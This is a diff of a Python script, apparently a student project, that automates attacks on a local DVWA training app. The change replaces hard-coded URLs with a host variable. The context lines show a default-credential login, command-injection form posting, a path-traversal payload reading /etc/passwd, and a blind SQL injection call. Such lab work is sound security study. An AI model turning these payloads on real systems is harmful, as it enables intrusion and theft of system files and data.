@@ -3,8 +3,10 @@ from bs4 import BeautifulSoup
 import re
 import urllib.request
 
+# host
+host = 'http://127.0.0.1/'
 # login to DVWA
-login_url = 'http://172.17.0.1/login.php'
+login_url = host +'login.php'
 username = 'admin'
 password = 'password'
 
@@ -24,8 +26,7 @@ response = session.post(login_url, data={
 })
 
 # Get HTML
-url = 'http://172.17.0.1/'
-response = session.get(url)
+response = session.get(host)
 
 # Parse HTML & Find Links
 soup = BeautifulSoup(response.content, "html.parser")
@@ -44,7 +45,7 @@ print(url_list)
 
 # ======== Command Injection cases ========
 
-urlD = 'http://172.17.0.1/vulnerabilities/exec/'
+urlD = host +'vulnerabilities/exec/'
 
 response = session.get(urlD)
 
@@ -65,7 +66,7 @@ for form in forms:
                 form_data[form_input.get('name')] = form_input.get('value')
                 if form_input.get('type') == 'text':
                     form_data[form_input.get('name')] = commandInjection
-                    response = session.post('http://172.17.0.1/vulnerabilities/exec/' + form.get('action'), data=form_data)
+                    response = session.post(host + 'vulnerabilities/exec/' + form.get('action'), data=form_data)
                     print("====================>\n" + response.text)
                     if response.text.find("www-data") != -1:
                         print("La commande a été exécutée avec succès")
@@ -82,7 +83,7 @@ for form in forms:
 # ======== File Inclusion cases ========
 
 
-url_File_inclusion = "http://127.0.0.1/vulnerabilities/fi/?page=include.php"
+url_File_inclusion = host + "vulnerabilities/fi/?page=include.php"
 
 basic_payload_file_inclusion_prompt = input("Perform basic LFI attack ?: [y] - [n]")
 basic_payload_file_inclusion = "../../../../../../../../../../etc/passwd"
@@ -132,5 +133,5 @@ OK_SRCH = "name: 1"
 # HIchem faut que tu mexplique comment tu geres les cookies avec session.get(url)
 cookies = "security=medium; PHPSESSID=xxx"
 # Change your IP
-url_base = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
+url_base = host + "dvwa/vulnerabilities/sqli_blind/"
 print("Version: " + blind_sql(url_base, cookies, OK_SRCH))
